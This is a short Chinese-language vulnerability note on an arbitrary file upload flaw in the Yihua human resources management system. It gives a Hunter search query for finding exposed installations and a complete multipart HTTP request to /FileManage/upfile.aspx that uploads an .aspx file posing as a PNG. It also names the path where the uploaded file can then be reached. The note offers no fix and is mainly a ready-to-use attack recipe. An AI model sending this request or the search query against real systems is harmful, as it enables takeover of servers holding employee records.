# 亿华人力资源管理系统upfile存在任意文件上传漏洞

# 一、漏洞简介
亿华人力资源管理系统是一款全面的人力资源管理软件，旨在帮助企业实现员工档案管理规范化、薪资管理自动化、招聘管理流程化等目标。该系统涵盖了人力资源管理的各个方面，包括员工档案管理、薪资管理、招聘管理、培训管理、福利管理等。亿华人力资源管理系统upfile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 亿华人力资源管理系统

# 三、资产测绘
+ hunter`web.body="亿华人力资源管理系统"`
+ 特征

![1700719530357-795ccebb-a7d7-426f-ad2e-6292dafa922e.png](./img/iEv2oxqoEmhNMSu_/1700719530357-795ccebb-a7d7-426f-ad2e-6292dafa922e-674856.png)

# 四、漏洞复现
```plain
POST /FileManage/upfile.aspx HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------3243433393122674734542415452
Content-Length: 659
Connection: close
Cookie: ASP.NET_SessionId=2gs554ezsztrgmbwf1dffzls
Upgrade-Insecure-Requests: 1

-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="__VIEWSTATE"

/wEPDwUKMTEwMjM4NDkyMWRktbRwLggX8FeyROMxp865VQxNInwjdx6WjO4Wq+j8FUg=
-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"

BD080F3A
-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="File"; filename="1.aspx"
Content-Type: image/png

123
-----------------------------3243433393122674734542415452
Content-Disposition: form-data; name="UploadButton"

开始上传
-----------------------------3243433393122674734542415452--

```

![1700991001207-7dffd895-f687-4e82-bfa2-c117df04e750.png](./img/iEv2oxqoEmhNMSu_/1700991001207-7dffd895-f687-4e82-bfa2-c117df04e750-033334.png)

上传文件位置

```plain
/FilesUpload/1.aspx
```

![1700991042096-6e61ec91-f9c2-4cc4-99f1-92b53c4a8f16.png](./img/iEv2oxqoEmhNMSu_/1700991042096-6e61ec91-f9c2-4cc4-99f1-92b53c4a8f16-289517.png)



> 更新: 2024-02-29 23:55:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xnk6usd7it2uhng6>